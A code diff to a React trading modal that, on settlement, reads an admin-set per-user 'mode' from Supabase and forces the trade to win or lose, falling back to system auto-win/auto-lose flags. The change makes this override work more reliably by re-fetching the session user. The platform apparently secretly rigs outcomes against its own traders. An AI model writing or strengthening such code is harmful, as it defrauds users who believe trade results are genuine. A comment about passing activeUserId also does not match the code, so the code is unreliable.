@@ -242,20 +242,28 @@ export default function TradingModal({
           clearInterval(timerRef.current);
           
           // --- 1. FETCH THE ADMIN OVERRIDE MODE FROM SUPABASE ---
-          // We wrap this in an async function to not block the UI
           const checkAndSettle = async () => {
             let adminMode = 'neutral';
+            let activeUserId = currentUser?.id;
             
             try {
-              // Check the user's profile for the 'mode' column set by SafeTrade-Admin
-              const { data: profileData, error } = await supabase
-                .from('profiles')
-                .select('mode')
-                .eq('id', currentUser?.id)
-                .single();
+              // Backup: If currentUser is null for some reason, fetch the user by their session again
+              if (!activeUserId) {
+                  const { data: { user } } = await supabase.auth.getUser();
+                  activeUserId = user?.id;
+              }
 
-              if (!error && profileData) {
-                adminMode = profileData.mode || 'neutral';
+              if (activeUserId) {
+                // Check the user's profile for the 'mode' column set by SafeTrade-Admin
+                const { data: profileData, error } = await supabase
+                  .from('profiles')
+                  .select('mode')
+                  .eq('id', activeUserId)
+                  .single();
+
+                if (!error && profileData) {
+                  adminMode = profileData.mode || 'neutral';
+                }
               }
             } catch (err) {
               console.error("Error checking admin mode:", err);
@@ -269,7 +277,7 @@ export default function TradingModal({
             } else if (adminMode === 'lose') {
               win = false; // FORCED LOSE
             } else {
-              // NEUTRAL MODE: Fallback to Random 50/50
+              // NEUTRAL MODE: Fallback to Random 50/50 or System Settings
               if (systemSettings?.auto_win) {
                 win = true;
               } else if (systemSettings?.auto_lose) {
@@ -302,11 +310,14 @@ export default function TradingModal({
             onTradeComplete?.(transaction);
             onOrderComplete?.(transaction);
 
-            await persistTrade({
-              transaction,
-              balanceBefore: balanceBeforeTrade,
-              balanceAfter: updatedBalance,
-            });
+            // Pass activeUserId to persistTrade
+            if (activeUserId) {
+              await persistTrade({
+                transaction,
+                balanceBefore: balanceBeforeTrade,
+                balanceAfter: updatedBalance,
+              });
+            }
 
             if (mountedRef.current) {
               clearInterval(priceRef.current);
